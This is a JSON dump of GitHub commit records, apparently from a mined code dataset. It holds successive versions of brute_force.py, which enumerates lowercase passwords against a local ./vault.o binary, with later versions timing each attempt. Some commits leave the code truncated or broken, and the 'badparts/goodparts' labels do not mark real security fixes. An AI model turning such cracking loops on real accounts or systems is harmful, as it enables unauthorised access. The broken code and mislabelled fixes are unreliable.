tuple:\n\n    p = []\n\n    if n == 2:\n        p = points\n        return (distance(points[0], points[1]), p)\n    elif n == 3:\n        return three_points(points)\n    \n    mid = n \/\/ 2\n    mid_point = points[mid]\n    dl, pl = solve_2d(points[:mid], mid)\n    dr, pr = solve_2d(points[mid:], n - mid)\n\n    d, p = (dl, pl) if dl < dr else (dr, pr)\n    \n    strip = []\n    for i in range(n):\n        if abs(get_n_coord(points[i], 0) - get_n_coord(mid_point, 0)) < d:\n            strip.append(points[i])\n\n    # strip.sort(key = lambda point: get_n_coord(point, 1))\n    for i in range(len(strip)):\n        for j in range(i + 1, len(strip)):\n            if get_n_coord(strip[j], 1) - get_n_coord(strip[i], 1) < d:\n                nd = distance(strip[i], strip[j])\n                if nd < d: \n                    d = nd\n                    p = [strip[i], strip[j]]\n\n    return (d, p)\n\n\n    \n"}},"msg":"Update solve, add brute force"}},"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf":{"b98ea408804482a78f08c44050db378bad497550":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/b98ea408804482a78f08c44050db378bad497550","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/b98ea408804482a78f08c44050db378bad497550","sha":"b98ea408804482a78f08c44050db378bad497550","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 699723d..da12a7c 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,27 +1,27 @@\n-import subprocess\n+import itertools\n import string\n import time\n+import os\n \n-def crack_password():\n-    start = time.time()\n-    chars = string.ascii_lowercase\n-    attempts = 0\n-    password = []\n-    while True:\n-        for char in chars:\n-            attempts += 1\n-            guess = \"\".join(password + [char])\n-            result = subprocess.run([\".\/vault.o\", guess], capture_output=True)\n-            output = result.stdout.decode().strip()\n-            if output == \"Success\":\n-                print(\"Password found:\", guess)\n-                return\n-            elif output == \"Wrong password\":\n-                continue\n-            else:\n-                print(\"Unexpected output:\", output)\n-                return\n-        password.append(chars[0])\n+# Define the set of characters to use for the password\n+chars = string.ascii_lowercase\n \n-if __name__ == \"__main__\":\n-    crack_password()\n+# Define the length of the password\n+password_length = 8\n+\n+# Create a generator that yields all possible combinations of the characters\n+password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n+\n+start_time = time.time()\n+\n+# Iterate through each combination of characters\n+for combination in password_combinations:\n+    password = ''.join(combination)\n+    result = os.system(f\".\/vault.o {password}\")\n+\n+    if result == 0:\n+        print(f\"Success! The password is: {password}\")\n+        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+        break\n+\n+print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n-import subprocess\n+import itertools\n import string\n import time\n+import os\n \n-def crack_password():\n-    start = time.time()\n-    chars = string.ascii_lowercase\n-    attempts = 0\n-    password = []\n-    while True:\n-        for char in chars:\n-            attempts += 1\n-            guess = \"\".join(password + [char])\n-            result = subprocess.run([\".\/vault.o\", guess], capture_output=True)\n-            output = result.stdout.decode().strip()\n-            if output == \"Success\":\n-                print(\"Password found:\", guess)\n-                return\n-            elif output == \"Wrong password\":\n-                continue\n-            else:\n-                print(\"Unexpected output:\", output)\n-                return\n-        password.append(chars[0])\n+# Define the set of characters to use for the password\n+chars = string.ascii_lowercase\n \n-if __name__ == \"__main__\":\n-    crack_password()\n+# Define the length of the password\n+password_length = 8\n+\n+# Create a generator that yields all possible combinations of the characters\n+password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n+\n+start_time = time.time()\n+\n+# Iterate through each combination of characters\n+for combination in password_combinations:\n+    password = ''.join(combination)\n+    result = os.system(f\".\/vault.o {password}\")\n+\n+    if result == 0:\n+        print(f\"Success! The password is: {password}\")\n+        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+        break\n+\n+print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n","add":23,"remove":23,"filename":"\/brute_force.py","badparts":["import subprocess","def crack_password():","    start = time.time()","    chars = string.ascii_lowercase","    attempts = 0","    password = []","    while True:","        for char in chars:","            attempts += 1","            guess = \"\".join(password + [char])","            result = subprocess.run([\".\/vault.o\", guess], capture_output=True)","            output = result.stdout.decode().strip()","            if output == \"Success\":","                print(\"Password found:\", guess)","                return","            elif output == \"Wrong password\":","                continue","            else:","                print(\"Unexpected output:\", output)","                return","        password.append(chars[0])","if __name__ == \"__main__\":","    crack_password()"],"goodparts":["import itertools","chars = string.ascii_lowercase","password_length = 8","password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))","start_time = time.time()","for combination in password_combinations:","    password = ''.join(combination)","    result = os.system(f\".\/vault.o {password}\")","    if result == 0:","        print(f\"Success! The password is: {password}\")","        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")","        break","print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")"]}],"source":"\nimport subprocess import string import time def crack_password(): start=time.time() chars=string.ascii_lowercase attempts=0 password=[] while True: for char in chars: attempts +=1 guess=\"\".join(password +[char]) result=subprocess.run([\".\/vault.o\", guess], capture_output=True) output=result.stdout.decode().strip() if output==\"Success\": print(\"Password found:\", guess) return elif output==\"Wrong password\": continue else: print(\"Unexpected output:\", output) return password.append(chars[0]) if __name__==\"__main__\": crack_password() ","sourceWithComments":"import subprocess\nimport string\nimport time\n\ndef crack_password():\n    start = time.time()\n    chars = string.ascii_lowercase\n    attempts = 0\n    password = []\n    while True:\n        for char in chars:\n            attempts += 1\n            guess = \"\".join(password + [char])\n            result = subprocess.run([\".\/vault.o\", guess], capture_output=True)\n            output = result.stdout.decode().strip()\n            if output == \"Success\":\n                print(\"Password found:\", guess)\n                return\n            elif output == \"Wrong password\":\n                continue\n            else:\n                print(\"Unexpected output:\", output)\n                return\n        password.append(chars[0])\n\nif __name__ == \"__main__\":\n    crack_password()\n"}},"msg":"Update brute_force.py"},"ceb0db946cc3f13be30e9116dd86dd5311ff9766":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/ceb0db946cc3f13be30e9116dd86dd5311ff9766","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/ceb0db946cc3f13be30e9116dd86dd5311ff9766","sha":"ceb0db946cc3f13be30e9116dd86dd5311ff9766","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex da12a7c..1d9c6c1 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,7 +1,7 @@\n import itertools\n import string\n import time\n-import os\n+import subprocess\n \n # Define the set of characters to use for the password\n chars = string.ascii_lowercase\n@@ -14,14 +14,14 @@\n \n start_time = time.time()\n \n-# Iterate through each combination of characters\n-for combination in password_combinations:\n-    password = ''.join(combination)\n-    result = os.system(f\".\/vault.o {password}\")\n-\n-    if result == 0:\n-        print(f\"Success! The password is: {password}\")\n-        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+for password in password_combinations:\n+    password = \"\".join(password)\n+    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n+    if result.returncode == 0:\n+        print(f\"Success! The password is {password}\")\n         break\n+    else:\n+        print(f\"Wrong Password: {password}\")\n \n-print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+end_time = time.time()\n+print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":" \n start_time = time.time()\n \n-# Iterate through each combination of characters\n-for combination in password_combinations:\n-    password = ''.join(combination)\n-    result = os.system(f\".\/vault.o {password}\")\n-\n-    if result == 0:\n-        print(f\"Success! The password is: {password}\")\n-        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+for password in password_combinations:\n+    password = \"\".join(password)\n+    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n+    if result.returncode == 0:\n+        print(f\"Success! The password is {password}\")\n         break\n+    else:\n+        print(f\"Wrong Password: {password}\")\n \n-print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n+end_time = time.time()\n+print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n","add":9,"remove":9,"filename":"\/brute_force.py","badparts":["for combination in password_combinations:","    password = ''.join(combination)","    result = os.system(f\".\/vault.o {password}\")","    if result == 0:","        print(f\"Success! The password is: {password}\")","        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")","print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")"],"goodparts":["for password in password_combinations:","    password = \"\".join(password)","    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)","    if result.returncode == 0:","        print(f\"Success! The password is {password}\")","    else:","        print(f\"Wrong Password: {password}\")","end_time = time.time()","print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")"]}],"source":"\nimport itertools import string import time import os chars=string.ascii_lowercase password_length=8 password_combinations=itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length +1)) start_time=time.time() for combination in password_combinations: password=''.join(combination) result=os.system(f\".\/vault.o{password}\") if result==0: print(f\"Success! The password is:{password}\") print(f\"Time elapsed:{time.time() -start_time:.2f} seconds\") break print(f\"Time elapsed:{time.time() -start_time:.2f} seconds\") ","sourceWithComments":"import itertools\nimport string\nimport time\nimport os\n\n# Define the set of characters to use for the password\nchars = string.ascii_lowercase\n\n# Define the length of the password\npassword_length = 8\n\n# Create a generator that yields all possible combinations of the characters\npassword_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n\nstart_time = time.time()\n\n# Iterate through each combination of characters\nfor combination in password_combinations:\n    password = ''.join(combination)\n    result = os.system(f\".\/vault.o {password}\")\n\n    if result == 0:\n        print(f\"Success! The password is: {password}\")\n        print(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n        break\n\nprint(f\"Time elapsed: {time.time() - start_time:.2f} seconds\")\n"}},"msg":"Update brute_force.py"},"0bd8d426fce78f1cb4c653822791e119d5748fa3":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/0bd8d426fce78f1cb4c653822791e119d5748fa3","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/0bd8d426fce78f1cb4c653822791e119d5748fa3","sha":"0bd8d426fce78f1cb4c653822791e119d5748fa3","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 1d9c6c1..5958951 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -16,8 +16,9 @@\n \n for password in password_combinations:\n     password = \"\".join(password)\n-    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n-    if result.returncode == 0:\n+    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n+    stdout, stderr = process.communicate()\n+    if process.returncode == 0:\n         print(f\"Success! The password is {password}\")\n         break\n     else:\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n for password in password_combinations:\n     password = \"\".join(password)\n-    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n-    if result.returncode == 0:\n+    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n+    stdout, stderr = process.communicate()\n+    if process.returncode == 0:\n         print(f\"Success! The password is {password}\")\n         break\n     else:\n","add":3,"remove":2,"filename":"\/brute_force.py","badparts":["    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)","    if result.returncode == 0:"],"goodparts":["    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)","    stdout, stderr = process.communicate()","    if process.returncode == 0:"]}],"source":"\nimport itertools import string import time import subprocess chars=string.ascii_lowercase password_length=8 password_combinations=itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length +1)) start_time=time.time() for password in password_combinations: password=\"\".join(password) result=subprocess.run([\".\/vault.o\", password], capture_output=True, text=True) if result.returncode==0: print(f\"Success! The password is{password}\") break else: print(f\"Wrong Password:{password}\") end_time=time.time() print(f\"Elapsed time:{end_time -start_time:.2f} seconds\") ","sourceWithComments":"import itertools\nimport string\nimport time\nimport subprocess\n\n# Define the set of characters to use for the password\nchars = string.ascii_lowercase\n\n# Define the length of the password\npassword_length = 8\n\n# Create a generator that yields all possible combinations of the characters\npassword_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n\nstart_time = time.time()\n\nfor password in password_combinations:\n    password = \"\".join(password)\n    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n    if result.returncode == 0:\n        print(f\"Success! The password is {password}\")\n        break\n    else:\n        print(f\"Wrong Password: {password}\")\n\nend_time = time.time()\nprint(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n"}},"msg":"Update brute_force.py"},"ae21108aeed419c4250b36e217edd984a0b1fe2c":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/ae21108aeed419c4250b36e217edd984a0b1fe2c","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/ae21108aeed419c4250b36e217edd984a0b1fe2c","sha":"ae21108aeed419c4250b36e217edd984a0b1fe2c","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 5958951..1d9c6c1 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -16,9 +16,8 @@\n \n for password in password_combinations:\n     password = \"\".join(password)\n-    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n-    stdout, stderr = process.communicate()\n-    if process.returncode == 0:\n+    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n+    if result.returncode == 0:\n         print(f\"Success! The password is {password}\")\n         break\n     else:\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n for password in password_combinations:\n     password = \"\".join(password)\n-    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n-    stdout, stderr = process.communicate()\n-    if process.returncode == 0:\n+    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n+    if result.returncode == 0:\n         print(f\"Success! The password is {password}\")\n         break\n     else:\n","add":2,"remove":3,"filename":"\/brute_force.py","badparts":["    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)","    stdout, stderr = process.communicate()","    if process.returncode == 0:"],"goodparts":["    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)","    if result.returncode == 0:"]}],"source":"\nimport itertools import string import time import subprocess chars=string.ascii_lowercase password_length=8 password_combinations=itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length +1)) start_time=time.time() for password in password_combinations: password=\"\".join(password) process=subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE) stdout, stderr=process.communicate() if process.returncode==0: print(f\"Success! The password is{password}\") break else: print(f\"Wrong Password:{password}\") end_time=time.time() print(f\"Elapsed time:{end_time -start_time:.2f} seconds\") ","sourceWithComments":"import itertools\nimport string\nimport time\nimport subprocess\n\n# Define the set of characters to use for the password\nchars = string.ascii_lowercase\n\n# Define the length of the password\npassword_length = 8\n\n# Create a generator that yields all possible combinations of the characters\npassword_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n\nstart_time = time.time()\n\nfor password in password_combinations:\n    password = \"\".join(password)\n    process = subprocess.Popen([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if process.returncode == 0:\n        print(f\"Success! The password is {password}\")\n        break\n    else:\n        print(f\"Wrong Password: {password}\")\n\nend_time = time.time()\nprint(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n"}},"msg":"Update brute_force.py"},"e650785073d12d91705a7089761682b5c9df00ab":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/e650785073d12d91705a7089761682b5c9df00ab","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/e650785073d12d91705a7089761682b5c9df00ab","sha":"e650785073d12d91705a7089761682b5c9df00ab","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 1d9c6c1..187d057 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,27 +1,18 @@\n-import itertools\n-import string\n-import time\n import subprocess\n+import time\n+import itertools\n \n-# Define the set of characters to use for the password\n-chars = string.ascii_lowercase\n-\n-# Define the length of the password\n-password_length = 8\n-\n-# Create a generator that yields all possible combinations of the characters\n-password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n+start = time.time()\n \n-start_time = time.time()\n+alphabet = \"abcdefghijklmnopqrstuvwxyz\"\n+password_length = 6\n \n-for password in password_combinations:\n-    password = \"\".join(password)\n-    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n-    if result.returncode == 0:\n-        print(f\"Success! The password is {password}\")\n+for password_tuple in itertools.product(alphabet, repeat=password_length):\n+    password = \"\".join(password_tuple)\n+    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n+    if b\"Success\" in result.stdout:\n+        print(\"Found password:\", password)\n         break\n-    else:\n-        print(f\"Wrong Password: {password}\")\n \n-end_time = time.time()\n-print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n+end = time.time()\n+print(\"Elapsed time:\", end - start, \"seconds\")\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n-import itertools\n-import string\n-import time\n import subprocess\n+import time\n+import itertools\n \n-# Define the set of characters to use for the password\n-chars = string.ascii_lowercase\n-\n-# Define the length of the password\n-password_length = 8\n-\n-# Create a generator that yields all possible combinations of the characters\n-password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n+start = time.time()\n \n-start_time = time.time()\n+alphabet = \"abcdefghijklmnopqrstuvwxyz\"\n+password_length = 6\n \n-for password in password_combinations:\n-    password = \"\".join(password)\n-    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n-    if result.returncode == 0:\n-        print(f\"Success! The password is {password}\")\n+for password_tuple in itertools.product(alphabet, repeat=password_length):\n+    password = \"\".join(password_tuple)\n+    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n+    if b\"Success\" in result.stdout:\n+        print(\"Found password:\", password)\n         break\n-    else:\n-        print(f\"Wrong Password: {password}\")\n \n-end_time = time.time()\n-print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n+end = time.time()\n+print(\"Elapsed time:\", end - start, \"seconds\")\n","add":12,"remove":21,"filename":"\/brute_force.py","badparts":["import itertools","import string","import time","chars = string.ascii_lowercase","password_length = 8","password_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))","start_time = time.time()","for password in password_combinations:","    password = \"\".join(password)","    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)","    if result.returncode == 0:","        print(f\"Success! The password is {password}\")","    else:","        print(f\"Wrong Password: {password}\")","end_time = time.time()","print(f\"Elapsed time: {end_time - start_time:.2f} seconds\")"],"goodparts":["import time","import itertools","start = time.time()","alphabet = \"abcdefghijklmnopqrstuvwxyz\"","password_length = 6","for password_tuple in itertools.product(alphabet, repeat=password_length):","    password = \"\".join(password_tuple)","    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)","    if b\"Success\" in result.stdout:","        print(\"Found password:\", password)","end = time.time()","print(\"Elapsed time:\", end - start, \"seconds\")"]}],"source":"\nimport itertools import string import time import subprocess chars=string.ascii_lowercase password_length=8 password_combinations=itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length +1)) start_time=time.time() for password in password_combinations: password=\"\".join(password) result=subprocess.run([\".\/vault.o\", password], capture_output=True, text=True) if result.returncode==0: print(f\"Success! The password is{password}\") break else: print(f\"Wrong Password:{password}\") end_time=time.time() print(f\"Elapsed time:{end_time -start_time:.2f} seconds\") ","sourceWithComments":"import itertools\nimport string\nimport time\nimport subprocess\n\n# Define the set of characters to use for the password\nchars = string.ascii_lowercase\n\n# Define the length of the password\npassword_length = 8\n\n# Create a generator that yields all possible combinations of the characters\npassword_combinations = itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, password_length + 1))\n\nstart_time = time.time()\n\nfor password in password_combinations:\n    password = \"\".join(password)\n    result = subprocess.run([\".\/vault.o\", password], capture_output=True, text=True)\n    if result.returncode == 0:\n        print(f\"Success! The password is {password}\")\n        break\n    else:\n        print(f\"Wrong Password: {password}\")\n\nend_time = time.time()\nprint(f\"Elapsed time: {end_time - start_time:.2f} seconds\")\n"}},"msg":"Update brute_force.py"},"f05a993f94c1199668955a7a8cda93d76ea4d27f":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/f05a993f94c1199668955a7a8cda93d76ea4d27f","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/f05a993f94c1199668955a7a8cda93d76ea4d27f","sha":"f05a993f94c1199668955a7a8cda93d76ea4d27f","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 187d057..1ae3350 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,18 +1,28 @@\n-import subprocess\n import time\n-import itertools\n+import subprocess\n \n-start = time.time()\n+# Character set for password generation\n+charset = 'abcdefghijklmnopqrstuvwxyz'\n+password_length = 8 # Assumed password length\n \n-alphabet = \"abcdefghijklmnopqrstuvwxyz\"\n-password_length = 6\n+# Function to calculate the time taken for password verification\n+def check_password(password):\n+    start_time = time.time()\n+    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)\n+    end_time = time.time()\n+    time_taken = end_time - start_time\n+    return (result.stdout.decode().strip(), time_taken)\n \n-for password_tuple in itertools.product(alphabet, repeat=password_length):\n-    password = \"\".join(password_tuple)\n-    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n-    if b\"Success\" in result.stdout:\n-        print(\"Found password:\", password)\n-        break\n+# Brute-force attack\n+for i in range(26 ** password_length):\n+    password = ''\n+    temp = i\n+    for j in range(password_length):\n+        password = charset[temp % 26] + password\n+        temp \/\/= 26\n \n-end = time.time()\n-print(\"Elapsed time:\", end - start, \"seconds\")\n+    result, time_taken = check_password(password)\n+    if result == 'Success':\n+        print(f'Password found: {password}')\n+        break\n+    elif time_taken >=\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n-import subprocess\n import time\n-import itertools\n+import subprocess\n \n-start = time.time()\n+# Character set for password generation\n+charset = 'abcdefghijklmnopqrstuvwxyz'\n+password_length = 8 # Assumed password length\n \n-alphabet = \"abcdefghijklmnopqrstuvwxyz\"\n-password_length = 6\n+# Function to calculate the time taken for password verification\n+def check_password(password):\n+    start_time = time.time()\n+    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)\n+    end_time = time.time()\n+    time_taken = end_time - start_time\n+    return (result.stdout.decode().strip(), time_taken)\n \n-for password_tuple in itertools.product(alphabet, repeat=password_length):\n-    password = \"\".join(password_tuple)\n-    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n-    if b\"Success\" in result.stdout:\n-        print(\"Found password:\", password)\n-        break\n+# Brute-force attack\n+for i in range(26 ** password_length):\n+    password = ''\n+    temp = i\n+    for j in range(password_length):\n+        password = charset[temp % 26] + password\n+        temp \/\/= 26\n \n-end = time.time()\n-print(\"Elapsed time:\", end - start, \"seconds\")\n+    result, time_taken = check_password(password)\n+    if result == 'Success':\n+        print(f'Password found: {password}')\n+        break\n+    elif time_taken >=\n","add":23,"remove":13,"filename":"\/brute_force.py","badparts":["import subprocess","import itertools","start = time.time()","alphabet = \"abcdefghijklmnopqrstuvwxyz\"","password_length = 6","for password_tuple in itertools.product(alphabet, repeat=password_length):","    password = \"\".join(password_tuple)","    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)","    if b\"Success\" in result.stdout:","        print(\"Found password:\", password)","        break","end = time.time()","print(\"Elapsed time:\", end - start, \"seconds\")"],"goodparts":["import subprocess","charset = 'abcdefghijklmnopqrstuvwxyz'","password_length = 8 # Assumed password length","def check_password(password):","    start_time = time.time()","    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)","    end_time = time.time()","    time_taken = end_time - start_time","    return (result.stdout.decode().strip(), time_taken)","for i in range(26 ** password_length):","    password = ''","    temp = i","    for j in range(password_length):","        password = charset[temp % 26] + password","        temp \/\/= 26","    result, time_taken = check_password(password)","    if result == 'Success':","        print(f'Password found: {password}')","        break","    elif time_taken >="]}],"source":"\nimport subprocess import time import itertools start=time.time() alphabet=\"abcdefghijklmnopqrstuvwxyz\" password_length=6 for password_tuple in itertools.product(alphabet, repeat=password_length): password=\"\".join(password_tuple) result=subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE) if b\"Success\" in result.stdout: print(\"Found password:\", password) break end=time.time() print(\"Elapsed time:\", end -start, \"seconds\") ","sourceWithComments":"import subprocess\nimport time\nimport itertools\n\nstart = time.time()\n\nalphabet = \"abcdefghijklmnopqrstuvwxyz\"\npassword_length = 6\n\nfor password_tuple in itertools.product(alphabet, repeat=password_length):\n    password = \"\".join(password_tuple)\n    result = subprocess.run([\".\/vault.o\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    if b\"Success\" in result.stdout:\n        print(\"Found password:\", password)\n        break\n\nend = time.time()\nprint(\"Elapsed time:\", end - start, \"seconds\")\n"}},"msg":"Update brute_force.py"},"569866bfe6f5774c8fba6f2f98b14d43f0cbdc3a":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/569866bfe6f5774c8fba6f2f98b14d43f0cbdc3a","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/569866bfe6f5774c8fba6f2f98b14d43f0cbdc3a","sha":"569866bfe6f5774c8fba6f2f98b14d43f0cbdc3a","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 1ae3350..c187692 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -8,7 +8,7 @@\n # Function to calculate the time taken for password verification\n def check_password(password):\n     start_time = time.time()\n-    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)\n+    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n     end_time = time.time()\n     time_taken = end_time - start_time\n     return (result.stdout.decode().strip(), time_taken)\n@@ -23,6 +23,4 @@ def check_password(password):\n \n     result, time_taken = check_password(password)\n     if result == 'Success':\n-        print(f'Password found: {password}')\n-        break\n-    elif time_taken >=\n+        print(f'Password found: {password}\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n # Function to calculate the time taken for password verification\n def check_password(password):\n     start_time = time.time()\n-    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)\n+    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n     end_time = time.time()\n     time_taken = end_time - start_time\n     return (result.stdout.decode().strip(), time_taken)\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)"],"goodparts":["    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)"]},{"diff":"\n \n     result, time_taken = check_password(password)\n     if result == 'Success':\n-        print(f'Password found: {password}')\n-        break\n-    elif time_taken >=\n+        print(f'Password found: {password}\n","add":1,"remove":3,"filename":"\/brute_force.py","badparts":["        print(f'Password found: {password}')","        break","    elif time_taken >="],"goodparts":["        print(f'Password found: {password}"]}],"source":"\nimport time import subprocess charset='abcdefghijklmnopqrstuvwxyz' password_length=8 def check_password(password): start_time=time.time() result=subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE) end_time=time.time() time_taken=end_time -start_time return(result.stdout.decode().strip(), time_taken) for i in range(26 ** password_length): password='' temp=i for j in range(password_length): password=charset[temp % 26] +password temp \/\/=26 result, time_taken=check_password(password) if result=='Success': print(f'Password found:{password}') break elif time_taken >= ","sourceWithComments":"import time\nimport subprocess\n\n# Character set for password generation\ncharset = 'abcdefghijklmnopqrstuvwxyz'\npassword_length = 8 # Assumed password length\n\n# Function to calculate the time taken for password verification\ndef check_password(password):\n    start_time = time.time()\n    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE)\n    end_time = time.time()\n    time_taken = end_time - start_time\n    return (result.stdout.decode().strip(), time_taken)\n\n# Brute-force attack\nfor i in range(26 ** password_length):\n    password = ''\n    temp = i\n    for j in range(password_length):\n        password = charset[temp % 26] + password\n        temp \/\/= 26\n\n    result, time_taken = check_password(password)\n    if result == 'Success':\n        print(f'Password found: {password}')\n        break\n    elif time_taken >=\n"}},"msg":"Update 